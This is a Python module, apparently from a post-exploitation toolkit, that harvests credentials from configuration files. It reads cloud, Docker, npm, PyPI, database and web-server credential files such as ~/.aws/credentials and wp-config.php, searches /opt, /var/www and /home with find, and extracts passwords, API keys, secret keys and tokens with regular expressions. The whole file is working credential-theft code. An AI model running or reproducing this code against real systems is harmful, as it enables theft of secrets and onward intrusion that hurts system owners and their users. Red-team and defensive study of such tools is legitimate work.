"""
Configuration file harvesting
"""

import os
from ..core.utils import run_command, safe_read_file, extract_credentials_with_patterns


class ConfigHarvester:
    """Harvest credentials from configuration files"""
    
    CREDENTIAL_PATTERNS = [
        r'password["\s]*[:=]["\s]*["\']([^"\']+)["\']',
        r'passwd["\s]*[:=]["\s]*["\']([^"\']+)["\']',
        r'api[_-]?key["\s]*[:=]["\s]*["\']([^"\']+)["\']',
        r'secret[_-]?key["\s]*[:=]["\s]*["\']([^"\']+)["\']',
        r'access[_-]?token["\s]*[:=]["\s]*["\']([^"\']+)["\']',
        r'db[_-]?password["\s]*[:=]["\s]*["\']([^"\']+)["\']',
        r'DB_PASSWORD["\s]*[:=]["\s]*["\']([^"\']+)["\']'
    ]
    
    def __init__(self, credentials: dict, os_type: str):
        self.credentials = credentials
        self.os_type = os_type
    
    def harvest(self):
        """Search configuration files for credentials"""
        print("\n[*] Searching configuration files for credentials...")
        
        config_files = self._get_config_files()
        found_count = 0
        
        for config_file in config_files:
            if config_file and os.path.exists(config_file):
                content = safe_read_file(config_file)
                
                if content:
                    creds = extract_credentials_with_patterns(content, self.CREDENTIAL_PATTERNS)
                    
                    for cred in creds:
                        self.credentials['passwords'].append({
                            'source': config_file,
                            'type': 'Configuration File',
                            'credential': cred['credential'],
                            'context': cred['context']
                        })
                        found_count += 1
                        print(f"  [+] Found credential in: {config_file}")
        
        print(f"  [*] Found {found_count} credentials in configuration files")
    
    def _get_config_files(self) -> list:
        """Get list of configuration files to check"""
        if self.os_type == 'posix':
            config_files = [
                '/etc/mysql/my.cnf',
                '/etc/redis/redis.conf',
                '/etc/mongodb.conf',
                '/var/www/html/wp-config.php',
                '/var/www/html/config.php',
                os.path.expanduser('~/.aws/credentials'),
                os.path.expanduser('~/.docker/config.json'),
                os.path.expanduser('~/.npmrc'),
                os.path.expanduser('~/.pypirc')
            ]
            
            # Find additional config files
            find_configs = run_command(
                'find /opt /var/www /home -name "*.conf" -o -name "config.*" -o -name "*.config" 2>/dev/null | head -50'
            )
            
            if find_configs and 'Error' not in find_configs:
                config_files.extend(find_configs.strip().split('\n'))
        
        else:
            config_files = [
                'C:\\inetpub\\wwwroot\\web.config',
                os.path.expanduser('~/.aws/credentials')
            ]
        
        return config_files